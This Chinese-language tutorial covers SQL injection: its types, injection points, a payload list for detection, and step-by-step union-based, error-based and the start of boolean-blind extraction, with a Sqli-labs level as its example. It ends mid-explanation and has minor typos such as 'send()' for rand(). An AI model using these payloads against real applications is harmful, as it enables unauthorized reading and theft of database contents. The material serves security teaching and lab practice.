### SQL注入漏洞概述

#### 什么是SQL注入

SQL注入（SQLi）是一种网络安全漏洞，允许攻击者干扰应用程序对其数据库的查询。通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，SQL语句带入数据库使恶意SQL语句得以执行可以查看通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。在许多情况下，攻击者可以修改或删除这些数据，从而导致应用程序的内容或行为发生持续变化。
在某些情况下，攻击者可以升级SQL注入攻击以破坏底层服务器或其他后端基础架构或执行拒绝服务攻击。

### SQL 注入类型分类

- 从注入参数类型分：数字型注入、字符型注入
- 从注入效果分：报错注入、无显盲注（布尔盲注、延时盲注）、联合注入、堆叠注入、宽字节注入、二次注入
- 从提交方式分：GET注入、POST注入、HTTP头注入（UA注入、XFF注入）、COOKIE注入

### SQL 注入的常见位置

- URL参数：攻击者可以在应用程序的 URL 参数中注入恶意 SQL 代码，例如在查询字符串或路径中
- 表单输入：应用程序中的表单输入框，如用户名、密码、搜索框等，如果没有进行充分的输入验证和过滤，就可能成为 SQL 注入的目标
- Cookie：如果应用程序使用 Cookie 来存储用户信息或会话状态，攻击者可以通过修改 Cookie 中的值来进行 SQL 注入
- HTTP头部：有些应用程序可能会从 HTTP 头部中获取数据，攻击者可以在 HTTP 头部中注入恶意 SQL 代码。
- 数据库查询语句：在应用程序中直接拼接 SQL 查询语句的地方，如果没有正确地对用户输入进行过滤和转义，就可能导致 SQL 注入漏洞

### 如何判断是否存在 SQL 注入

- 单双引号判断
- and 型判断
- or 或 xor 判断
- exp(709) exp(710)

测试payload：

```
'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --
'''''''''''''UNION SELECT '2
%00
/*…*/ 
+		addition, concatenate (or space in url)
||		(double pipe) concatenate
%		wildcard attribute indicator

@variable	local variable
@@variable	global variable


# Numeric
AND 1
AND 0
AND true
AND false
1-false
1-true
1*56
-2


1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

1' ORDER BY 1,2--+
1' ORDER BY 1,2,3--+

1' GROUP BY 1,2,--+
1' GROUP BY 1,2,3--+
' GROUP BY columnnames having 1=1 --


-1' UNION SELECT 1,2,3--+
' UNION SELECT sum(columnname ) from tablename --


-1 UNION SELECT 1 INTO @,@
-1 UNION SELECT 1 INTO @,@,@

1 AND (SELECT * FROM Users) = 1	

' AND MID(VERSION(),1,1) = '5';

' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --


Finding the table name


Time-Based:
,(select * from (select(sleep(10)))a)
%2c(select%20*%20from%20(select(sleep(10)))a)
';WAITFOR DELAY '0:0:30'--

Comments:

#	    Hash comment
/*  	C-style comment
-- -	SQL comment
;%00	Nullbyte
`	    Backtick
```

### SQL语句基础

#### 注释

- `#`：不建议直接使用，会被浏览器当做 URL 的书签，建议使用其 URL 编码形式`%23`
- `--+`：本质上是`--空格`，`+`会被浏览器解释为空格，也可以使用 URL 编码形式`--%20`
- `/**/`：多行注释，常被用作空格
- `/*! */`：内联注释

#### 函数

- `group_concat()`：使数据在一列中输出
- `concat_ws()`：就是为了区分列的界限，`concat_ws('字符',字段1,字段2,.....)`
- `database()`：主要是返回当前（默认）数据库的名称

### 联合注入

#### 第一步-类型判断

判断是否存在注入，若存在，则判断是字符型还是数字型，简单来说就是数字型不需要符号包裹，而字符型需要

数字型：`select * from table where id =$id`
字符型：`select * from table where id='$id'`

判断类型一般可以使用 and 型结合永真式和永假式

判断数字型：

```
1 and 1=1 #永真式   select * from table where id=1 and 1=1
1 and 1=2 #永假式   select * from table where id=1 and 1=2
#若永假式运行错误，则说明此SQL注入为数字型注入
```

判断字符型：

```
1' and '1'='1
1' and '1'='2
#若永假式运行错误，则说明此SQL注入为字符型注入
```

#### 第二步-查字段个数

使用`order by`查询字段个数，上一步我们已经判断出了是字符型还是数字型；

使用`order by 数字`来查询字段的个数，这里的关键是找到**临界值**，例如`order by 4`时候还在报错，但是`order by 3`时没有出现报错，3 就是这里的临界值，说明这里存在 3 个字段

```
?id=1' order by 3%23
```

#### 第三步-查找显示位

使用`union select`查找显示位，上一步我们已经知道了字段的具体个数，现在我们要判断这些字段的哪几个会在前端显示出来，这些显示出来的字段叫做显示位，我们使用`union select 1,2,3.....(字段个数是多少个就写到几)`来对位置的顺序进行判断（其中数字代表是几号显示位）

这里我们需要对框架做一下微调，也就是将 1 改为 -1，**这里修改的目的是查询一个不存在的 id，使得第一句为空，显示第二句的结果**;

```
?id=-1' union select 1,2,3%23
```

#### 第四步-爆库名

使用`database()`函数爆出库名，`database()`函数主要是返回当前（默认）数据库的名称，这里我们把它用在哪个显示位上都可以;

```
?id=-1' union select 1,2,database()%23
```

#### 第五步-爆表名

基于库名使用`table_name`爆出表名，先来介绍一下使用到的函数和数据源：

- `group_concat()`函数：使数据在一列中输出
- `information_schema.tables`数据源：存储了数据表的元数据信息，我们主要使用此项数据源中的`table_name`和`table_schema`字段;

最终可以构造出 Payload 如下，可以获取到数据库中存在的几张表；

```
?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23
```

#### 第六步-爆列名

基于表名使用column_name爆出列名，此时数据源为information_schema.columns，位置在table_name='表名'(记得给表名加单引号)

最终构造 Payload 如下，可以获取到相应字段；

```
?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' %23
```

#### 第七步-爆信息

使用列名爆敏感信息，直接 from 表名即可，这里需要使用`group_concat(concat_ws())`实现数据的完整读取，`group_concat()`函数在前面几步就接触过，主要是使数据在一列中输出

这就带来了一个问题，如果直接把列放入`group_concat()`函数，列间的界限就不清晰了，`concat_ws()`就是为了区分列的界限所使用的，其语法如下：

```
concat_ws('字符',字段1,字段2,.....)
```

最终我们便可以构造出获取数据的 Payload：

```
?id=-1'union select 1,2,group_concat(concat_ws('-',id,email_id)) from 表名 %23
```

### 报错注入

报错注入的本质是使用一些指定的函数制造报错，从而从报错信息获得我们想要的内容，使用前提是**后台没有屏蔽数据库的报错信息，且报错信息会返回到前端，报错注入一般在无法确定显示位的时候使用**，我们先来了解一下报错注入的类型和会用到的函数。

#### XPath 导致的报错

updatexml()函数和extractvalue()函数都可以归类为是 XPath 格式不正确或缺失导致报错的函数。

##### updatexml() 函数

`updatexml()`函数本身是改变 XML 文档中符合条件的值，其语法如下：

```sql
updatexml(XML_document,XPath_string,new_value)
```

语法中使用到以下三个参数

- XML_document：XML 文档名称，使用 String 格式作为参数
- XPath_string：路径，XPath 格式，`updatexml()`函数如果**这项参数错误便会导致报错，我们主要利用的也是这个参数**
- new_value：替换后的值，使用 String 格式作为参数

```sql
updatexml(1,concat(0x7e,(select database()),0x7e),1);
```

##### extractvalue() 函数

extractvalue()函数本身用于在 XML 文档中查询指定字符，语法如下：

extractvalue(XML_document,xpath_string)

语法中使用到以下两个参数

- XML_document：XML 文档名称，使用 String 格式作为参数
- XPath_string：路径，XPath 格式，extractvalue()函数也在这里产生报错

```sql
extractvalue(1,concat(0x7e,(select database()),0x7e));
```

#### 主键重复导致的报错

主键报错注入是由于rand()，count() ，floor()三个函数和一个group by语句联合使用造成的，缺一不可

##### rand() 函数

`rand()`函数的基础语法是这样的，它的参数被叫做 seed(种子)，当种子为空的时候，`rand()`函数会返回一个`[0,1)`范围内的随机数，当种子为一个数值时，则会返回一个可复现的随机数序列

在 Mysql 中，只要输入种子，一定返回一个可复现的随机数序列，这里还有一个小细节，**种子是只取整数部分的，使用小数点后第一位进行四舍五入取整**

##### floor() 函数

`floor()`函数的作用就是返回小于等于括号内该值的最大整数，也就是取整，它这里的取整不是进行四舍五入，而是**直接留下整数位，去掉小数位，如果是负数则整数位需要加一**

##### count() 函数

`count()`是聚合函数的一种，是 SQL 的基础函数，除此以外，还有`sum()`、`avg()`、`min()`、`max()`等聚合函数，语法如下

```
select count(字段) from 表名; --得到该列值的非空值的行数

select count(*) from 表名; --用于统计整个表的行数
```

##### group by 语句

`group by`语句的用法如下，它用于结合聚合函数，根据一个或多个列对结果集进行分组

```
group by 列名;
```

深入一下它的工作原理，`group by`语句在执行时，会依次查出表中的记录并创建一个临时表（这个临时表是不可见的），`group by`的对象便是该临时表的主键（level），如果临时表中已经存在该主键，则将值加1，如果不存在，则将该主键**插入**到临时表中

##### 报错原因分析

`floor()`报错注入是利用下方这个相对固定的语句格式，导致的数据库报错

```sql
select count(*),(floor(rand(0)*2)) x from users group by x
```

我们先来分析`(floor(rand(0)*2))`在 SQL 语句中的含义，我们先来看它的内层`rand(0)*2`，以 0 为种子使用`send()`函数生成随机数序列，并且将数列中的每一项结果乘以 2

再将乘以 2 后的结果放入`floor()`函数取整，最后得出伪随机数列如下，因为使用了固定的随机数种子0，他每次产生的随机数列的前六位都是相同的0 1 1 0 1 1的顺序

这时我们思考一个问题，基于上面`group by`语句的工作原理，我们可以知道，主键重复了就会使`count(*)`的值加 1，最终只是`count(*)`的值不同，那为什么说是主键重复导致的报错呢？

其实是这里有一个细节没有介绍，当`group by`语句与`rand()`函数一起使用时，Mysql 会建立一张临时表，这张临时表有两个字段，一个是主键，一个是`count(*)`，此时临时表无任何值，Mysql 先计算`group by`后面的值，也就是`floor()`函数（它们之间是以`x`作为媒介传递的），**如果此时临时表中没有该主键，则在插入前`rand()`函数会再计算一次**

上面提到固定序列的第一个值为 0，Mysql 查询临时表，发现没有主键为 0 的记录，因此将此数据插入，这时因为**临时表中没有该主键**，Mysql 插入的过程中还会计算一次`group by`后面的值，也就是`floor()`函数，但是此时`floor()`函数的结果为固定序列的第二个值，因此插入的主键为1，`count(*)`也为1

#### 数据溢出导致的报错

##### exp() 函数

MySQL 中的`exp()`函数用于将 e 提升为指定数字 x 的幂，也就是 $e^{x}$

```
exp(x)
```

例如`exp(2)`就是 $e^{2}$

我们可用利用 Mysql Double 数值范围有限的特性构造报错，一旦结果超过范围，`exp()`函数就会报错，这个分界点就是 709，当`exp()`函数中的数字超过 709 时就会产生报错

当 MySQL 版本大于 5.5.53 时，`exp()`函数报错无法返回查询结果，只会得到一个报错，所以在真实环境中使用它做注入局限性还是比较大的，但是可以用判断是否存在 SQL 注入

##### pow() 函数

MySQL 中的`pow()`函数用于将 x(基数) 提升为 y(指数) 的幂，也就是 $x^{y}$，语法如下

```
pow(x,y)
```

报错原理和`exp()`函数一样，超出了 Mysql Double 数值的范围，导致报错

#### 空间数据类型导致的错误

这类报错因为 Mysql 版本限制导致用的比较少，这里列出来，大家有兴趣的话可以做一下深入研究，简单来说，这类函数报错的原因是**函数对参数要求是形如（1 2,3 3,2 2 1）这样几何数据，如果不满足要求，则会报错**，可以产生报错的函数如下：

```
geometrycollection()
multiponint()
polygon()
multipolygon()
linestring()
multilinestring()
```

### 无显注入（盲注）

无显注入适用于无法直接从页面上看到注入语句的执行结果，甚至连注入语句是否执行都无从得知的情况，这种情况我们就要利用一些特性和函数**自己创造判断条件**

#### 基于布尔的盲注

在介绍布尔盲注的原理前，先来了解一下它用到的函数

#### 常用函数

- `left()`函数：从左边截取指定长度的字符串

  ```
  left(指定字符串，截取长度)
  ```

- `length()`函数：获取指定字符串的长度

  ```
  length(指定字符串)
  ```

- `substr()`函数和`mid()`函数：截取字符串，可以指定起始位置（从 1 开始计算）和长度

  ```
  substr(字符串，起始位置，截取长度)
  mid(字符串，起始位置，截取长度)
  ```

- `ascii()`函数：将指定字符串进行 ascii 编码

  ```
  ascii(指定字符串)
  ```

  \### 布尔盲注原理

布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断，这里我们用 Sqli-labs 第八关帮助大家理解它

先添加参数`?id=1`

先用单引号判断类型，发现添加单引号后并没有报错，但是 You are in... 消失了，这里也就为我们判断创造了条件，**后面我们就需要观察 You are in... 是否出现，找不同情况**

这里我们再添加一个单引号，发现 You are in... 出现，则本关为字符型注入，使用单引号包裹

因为这里只会回显真或假，无法直接拿到数据库的名字，但是我们可以降低一点条件，可以**先判断出数据库名的长度（最长为 30），这里可以先给一个范围，观察一下回显（二分法）**

```
//先猜测数据库名是否比5长，发现为真
1' and length(database())>5--+

//再判断数据库是否比10长，发现为假
1' and length(database())>10--+

//此时数据库大于5小于等于10，依次尝试可以发现长度为8
1' and length(database())=8--+
```

拿到长度后，我们使用`substr()`函数或`mid()`函数一位一位的猜测数据库字符，Mysql 库名一共可以使用 63 个字符，分别是：`a-z`、`A-Z`、`0-9`、`_`

